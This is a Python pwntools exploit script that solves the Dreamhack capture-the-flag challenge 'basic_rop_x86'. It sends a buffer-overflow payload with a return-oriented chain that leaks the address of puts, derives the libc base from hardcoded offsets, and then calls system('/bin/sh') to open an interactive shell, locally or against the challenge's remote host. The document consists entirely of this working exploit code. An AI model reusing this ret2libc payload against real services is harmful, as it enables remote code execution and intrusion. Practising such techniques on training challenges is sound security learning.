from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/rop86/basic_rop_x86')
p=elf.process()

#context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:24275'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p, gdbscript = 'b* 0x8048601')

puts_plt = elf.plt[b'puts']
puts_got = elf.got[b'puts']
main = 0x80485d9

payload = b"A"*63 + b"S" + b"B"*8 + p32(puts_plt) + p32(main) + p32(puts_got)
p.send(payload)

p.recvuntil(b"S")
data1 = p.recv(4)
val = u64(data1.ljust(8, b"\x00"))
print(f"data1 ist {hex(val)}!")
sleep(1)

puts_offset = 0x072830
system_offset = 0x047cb0
binsh_offset = 0x1b90f5

libc = val - puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

payload = b"A"*63 + b"S" + b"B"*8 + p32(system) + p32(0x0) + p32(binsh)
p.send(payload)

p.interactive()
